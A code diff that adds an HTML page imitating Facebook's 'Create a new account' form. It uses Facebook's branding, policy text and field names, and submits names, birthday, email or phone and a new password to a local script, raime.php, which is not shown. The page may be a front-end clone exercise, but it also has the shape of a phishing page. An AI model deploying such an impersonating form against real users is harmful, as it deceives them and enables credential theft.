@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign Up for Facebook</title>
+    <link rel="stylesheet" href="main.css">
+</head>
+<body>
+    <div class="container">
+        <h1 class="logo">facebook</h1>
+        
+        <div class="card">
+            <h2>Create a new account</h2>
+            <p class="subtitle">It's quick and easy.</p>
+            <hr>
+
+            <form action="raime.php">
+                <div class="row">
+                    <input type="text" name="firstname" placeholder="First name">
+                    <input type="text" name="lastname" placeholder="Last name">
+                </div>
+
+                <label class="field-label">Birthday</label>
+                <div class="row">
+                    <select name="birthday_month">
+                        <option value="1">Jan</option>
+                        <option value="2">Feb</option>
+                        <!-- დანარჩენი თვეები -->
+                        <option value="12" selected>Dec</option>
+                    </select>
+                    <select name="birthday_day">
+                        <option value="1">1</option>
+                        <option value="16" selected>16</option>
+                        <!-- დანარჩენი დღეები -->
+                    </select>
+                    <select name="birthday_year">
+                        <option value="2025">2025</option>
+                        <option value="2000">2000</option>
+                        <!-- დანარჩენი წლები -->
+                    </select>
+                </div>
+
+                <label class="field-label">Gender</label>
+                <div class="row gender-box">
+                    <label>Female <input type="radio" name="gender" value="female"></label>
+                    <label>Male <input type="radio" name="gender" value="male"></label>
+                    <label>Custom <input type="radio" name="gender" value="custom"></label>
+                </div>
+
+                <input type="text" name="reg_email__" placeholder="Mobile number or email">
+                <input type="password" name="reg_passwd__" placeholder="New password">
+
+                <p class="policy-text">
+                    People who use our service may have uploaded your contact information to Facebook. <a href="#">Learn more</a>.
+                </p>
+                <p class="policy-text">
+                    By clicking Sign Up, you agree to our <a href="#">Terms</a>, <a href="#">Privacy Policy</a> and <a href="#">Cookies Policy</a>. You may receive SMS Notifications from us and can opt out any time.
+                </p>
+
+                <div class="btn-container">
+                    <button type="submit" class="signup-btn">Sign Up</button>
+                </div>
+
+                <div class="login-link">
+                    <a href="#">Already have an account?</a>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
